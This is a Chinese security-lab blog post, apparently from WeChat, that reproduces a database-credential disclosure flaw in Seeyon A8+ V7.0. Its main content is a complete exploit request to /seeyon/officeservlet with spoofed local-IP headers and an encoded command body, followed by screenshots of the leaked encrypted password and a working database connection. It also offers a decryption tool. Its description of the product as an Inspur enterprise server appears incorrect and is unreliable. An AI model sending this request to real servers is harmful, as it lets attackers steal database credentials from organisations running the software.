<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nbnqAv6pKId1uzW3F2znJg)

**0x01 阅读须知**

**凯撒安全实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

**0x02 漏洞原理**

致远 A8 + 是中国致远信息技术股份有限公司（Inspur）开发的一款企业级服务器产品。作为致远公司的旗舰机型，A8 + 可提供高性能、可靠性和可扩展性，适用于各种企业级应用和数据中心环境。致远 A8 + 全版本存在数据库账号密码读取漏洞。**本文将复现该漏洞的利用方法。**

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssqZI0jibIYtriabDoZStWnnnSO6PC2hcE9UM29srXRwiboGTGRTy47IyV7ppeokdyU5HYUZyJcOoMAw/640?wx_fmt=png)

**0x03 漏洞利用**

影响版本：

致远 A8+（V7.0） SP1-SP3

**poc:**

**漏洞利用点为：/seeyon/officeservlet 接口，当访问接口时 响应值为 200 且出现如下响应体时，基本可认定该漏洞存在。**

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssqZI0jibIYtriabDoZStWnnnj80hSnHVwq9PwKic5FgfIr6zVHqbMwZWGr0ibTtKEHIjJ31LBrWK1LDg/640?wx_fmt=png)

**exp：**

```
POST http://xxxxx/seeyon/officeservlet HTTP/1.1
Host: xxxxx
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=98FCAEBB95CCBEB2C7209BEF7EAA7B3E; loginPageURL=
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 350
DBSTEP V3.0     285             0               0              
RECORDID=wLoi
CREATEDATE=wLehP4whzUoiw=66
originalFileId=wLoi
needReadFile=yRWZdAS6
originalCreateDate=wLehP4whzUoiw=66
OPTION=LKDxOWOWLlxwVlOW
TEMPLATE=qf85qf85qfDfeazQqAzvcRevy1W3eazvNaMUySz3d7TsdRDsyaM3nYli
COMMAND=BSTLOlMSOCQwOV66
affairMemberId=wLoi
affairMemberName=wLoi

```

**打入 exp** 

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssqZI0jibIYtriabDoZStWnnnboUOfSnsJTcPz2sNzQj6Ko1WV0cjOdjpkXTtZEMSN61bLjcTQA4H0Q/640?wx_fmt=png)

****成功获取到数据库账号密码：/1.0/YmNtdTMxMjhB** 但密码进行了加密，需配合工具 PassDecode-jar 对密文进行解密**

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssqZI0jibIYtriabDoZStWnnnIjDDms9WoibxtH76lF6VenUibrTxJvhyyspRFBvTcWiaJ5icJomytmKo7A/640?wx_fmt=png)

  解密后，数据库成功连接：

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssqZI0jibIYtriabDoZStWnnnLq27MfN9X3zdCdicibHL8yVkDy930Qw2suYtJtrNjkeGnQQ6WXIpJYmQ/640?wx_fmt=png)

关注公众号后台回复：20230729 获取解密工具

零日 / 一日 漏洞探讨加 Seven_-0928 、banxor9  

本实验室接受正规站点的授权渗透测试服务。如你的公司业务有 Web 渗透测试，高级渗透测试，红蓝对抗，黑客溯源，Java 代码审计等需求可联系以下微信进行商务洽谈：Xud330327

同时欢迎各位师傅加入 HW 闲聊吹水群（2000 人群）

**![](https://mmbiz.qpic.cn/mmbiz_jpg/fRWdakrtBst6p4gicEgvWYhUG15ibU3fHibbalVucuLZ76mxOCrOhTyhSu8Sru0DlwBYruQhnkIG8ia4shVDPd4VBg/640?wx_fmt=jpeg)**

![](https://mmbiz.qpic.cn/mmbiz_jpg/fRWdakrtBssPEvyWSBIpUFH4FYbmxzwydudRibUP8icaLbZJQ5WmBNtmFzWU8x8avVw34FqSicxFsaQCSfveDUXibg/640?wx_fmt=jpegwxfrom=5wx_lazy=1wx_co=1)